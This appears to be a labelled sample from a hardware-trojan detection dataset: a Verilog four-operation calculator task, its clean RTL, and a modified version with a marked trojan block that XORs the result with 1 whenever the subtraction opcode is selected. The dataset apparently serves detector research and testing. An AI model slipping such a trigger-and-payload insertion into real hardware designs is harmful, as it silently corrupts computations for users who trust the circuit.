@@ -1,0 +1,19 @@
+{
+    "sample_id": "SRTL_471",
+    "instruction": "\n\nYou are tasked with designing a verilog module for a simple calculator. The calculator should take in two 8-bit numbers and perform one of four operations: addition, subtraction, multiplication, or division. The operation to be performed is determined by a 2-bit input signal. The result of the operation should be output as an 8-bit number.\n\nThe module should have the following inputs and outputs:\n\nInputs:\n- `num1` : an 8-bit number representing the first operand\n- `num2` : an 8-bit number representing the second operand\n- `op` : a 2-bit number representing the operation to be performed. `00` indicates addition, `01` indicates subtraction, `10` indicates multiplication, and `11` indicates division.\n\nOutputs:\n- `result` : an 8-bit number representing the result of the operation.\n\nYou may assume that the inputs will always be valid and that division by zero will not occur.\n\n",
+    "original_rtl": "module calculator(\n  input [7:0] num1,\n  input [7:0] num2,\n  input [1:0] op,\n  output reg [7:0] result\n);\n\n  always @(*) begin\n    case (op)\n      2'b00: result = num1 + num2;\n      2'b01: result = num1 - num2;\n      2'b10: result = num1 * num2;\n      2'b11: result = num1 / num2;\n    endcase\n  end\n\nendmodule",
+    "modified_rtl": "module calculator(\n  input [7:0] num1,\n  input [7:0] num2,\n  input [1:0] op,\n  output reg [7:0] result\n);\n\n  always @(*) begin\n    case (op)\n      2'b00: result = num1 + num2;\n      2'b01: result = num1 - num2;\n      2'b10: result = num1 * num2;\n      2'b11: result = num1 / num2;\n    endcase\n  end\n\n\n\n// HT_START\n// Trojan Type: Lightweight_Payload_Override\nreg htrojan_trig;\nreg [7:0] htrojan_pay;\nalways @(*) begin\n    htrojan_trig = (op == 2'h1);\n    htrojan_pay = htrojan_trig ? (result ^ 8'h01) : result;\nend\n// HT_END\nendmodule",
+    "source_index": 471,
+    "label": "trojan",
+    "trojan_type": "Lightweight_Payload_Override",
+    "trigger_nodes": [
+        "htrojan_trig",
+        "op"
+    ],
+    "payload_nodes": [
+        "htrojan_pay",
+        "result"
+    ],
+    "obfuscation_applied": false,
+    "obfuscation_type": null
+}
